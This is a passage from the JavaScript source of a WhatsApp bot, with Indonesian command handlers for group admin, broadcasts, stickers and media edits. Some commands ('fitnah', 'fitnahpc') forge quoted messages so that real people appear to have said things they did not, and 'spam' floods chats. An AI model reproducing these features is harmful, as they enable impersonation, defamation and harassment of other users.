        if (args[0] == "open") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					fakegroup('S U C C E S S  O P E N I N G  G R O U P')
        } else if (args[0] == "close") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					fakegroup('S U C C E S S  C L O S I N G  G R O U P')
        } else if (!q) {
        	var ini_gopayy =`Halo @${sender.split("@")[0]} Gunakan ${prefix + command } Open / Close jika button tidak merespon`
var buttonss = [
{buttonId: 'group open', buttonText:{displayText: 'Open'}, type: 1},
{buttonId: 'group close', buttonText:{displayText: 'Close'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftroli,sendEphemeral: true 
			})
        }
        break
            case 'mystat': 
            case 'botstat': 
            case 'botstatus': 
			case 'mystatus':
				anu = process.uptime()
                teskny = `B O T  S T A T I S T I C\n`
				teskny +=`\`\`\`Group Chat : ${giid.length}\`\`\`\n`
				teskny +=`\`\`\`Personal Chat : ${totalchat.length - giid.length}\`\`\`\n`
				teskny +=`\`\`\`Total Chat : ${totalchat.length}\`\`\`\n`
				teskny +=`\`\`\`Speed :\`\`\` ${latensii.toFixed(4)} _Second_\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\`\n\n` 
				teskny +=`P H O N E  S T A T I S T I C\n`
				teskny +=`\`\`\`Wa Whatsapp : ${wa_version}\`\`\`\n`
				teskny +=`\`\`\`RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`\n`
				teskny +=`\`\`\`MCC : ${mcc}\`\`\`\n`
				teskny +=`\`\`\`MNC : ${mnc}\`\`\`\n`
				teskny +=`\`\`\`OS Version : ${os_version}\`\`\`\n`
				teskny +=`\`\`\`Merk Hp : ${device_manufacturer}\`\`\`\n`
				teskny +=`\`\`\`Versi Hp : ${device_model}\`\`\`\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\``
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case 'getbio':
				if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentionedd = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentionedd}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
		case 'caripesan':
		    case 'searchmessage':
				if (!q) return reply(`Penggunaan ${command} _nama pesannya_\n\nContoh \n --> ${command} halo`)
				reply(lang.wait())
				 xtext = args.join(' ')
				                cond = xtext.split(" ")
				                 a = await alpha.searchMessages(xtext, from, 10, 1)// count 10 
				                 fox = '*「 Message Search 」*\n\n'
				                num = 0
				                for (j of a.messages){
				                    num += 1
				                    if (j.message.conversation) {
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        } 
				                    }
				                    else if (j.message.extendedTextMessage){
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        } 
				                    }
				                }
				                reply(fox)
		                break
case 'setname':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.otNotAdm())
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup my', text, { quoted: fdoc })
					break 
case 'setdesc':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fdoc })
					break   
case 'spam':
if (!isGroup) return reply(lang.onlygc())
				if (!isGroupAdmins) return reply(lang.onlygcAdmin())
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = args.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				break 
case 'readall':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					reply(rdl)
					console.log(chats.length)
					break
case 'listpc':
					  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nTOTAL PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Name : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case 'listgroup':
				  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
				  ingfoo = await getGroup(totalchat)
				  teks1 = `*L I S T  G R O U P*\nTotal group: ${ingfoo.length}\n\n`
				   for (let i = 0; i < ingfoo.length; i++){
				   teks1 += `• Name grup : ${ingfoo[i].subject}\n• ID grup : ${ingfoo[i].id}\n• Cretae : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• Members : ${ingfoo[i].participants.length}\n\n`
				   }
				   reply(teks1)
				   break 
case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('dah bang')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus(lang.successBc())
					}
					break
         case 'owner':
         case 'creator':  
         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi_kak', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewa_kak', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
					break
                case 'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `> Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
			
                
             case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${thumbnail}`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)
                 
		    break
		    case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = false
		            fakeitem(lang.ownerOn())
		            break       
		    case 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(lang.ownerOff())
		            break   
		    case 'get':
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            break
		    case 'kontag':
		
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            break
		    case 'sticktag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            break
		    case 'totag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'fitnah':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case 'settarget':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case 'fitnahpc':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teksny`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var splitt = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: splitt[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${splitt[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case 'tomp3':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            fakegroup(mess.wait)
		            let encmedia2 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            let media2 = await alpha.downloadAndSaveMediaMessage(encmedia2)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
		            fs.unlinkSync(media2)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'fast':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media3} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media3)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'slow':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media4} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media4)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		case 'tupai':
encmedia6 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media6 = await alpha.downloadAndSaveMediaMessage(encmedia6)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media6} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media6)
if (err) return reply('Error!')
let hah = fs.readFileSync(ran)
alpha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
		    case 'reverse':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            encmedia5 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media5 = await alpha.downloadAndSaveMediaMessage(encmedia5)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media5} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media5)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'anime':
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            break
		    case 'kontak':
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            break
case 'setexif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    const namaPack = q.substring(0, q.indexOf('|') - 1)
                    const authorPack = q.substring(q.lastIndexOf('|') + 2)
                    fs.unlinkSync('./sticker/data.exif')
                    sleep(2000)
                    addMetadata(namaPack, authorPack)
                    fakestatus(`Success ubah wm sticker`)
                    break    
		    case 'take':
		    case 'colong':
		    		if (!isQuotedSticker) return reply('```Reply stc nya```')
		            encmedia_ = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media_ = await alpha.downloadAndSaveMediaMessage(encmedia_)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `SUBSCRIBE`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media_ , alpha, mek, from)
					break
			case 'stikerwm':
			case 'stickerwm':
		    case 'swm':
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break
		    case 'upswteks':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case 'upswimage':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case 'upswvideo':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
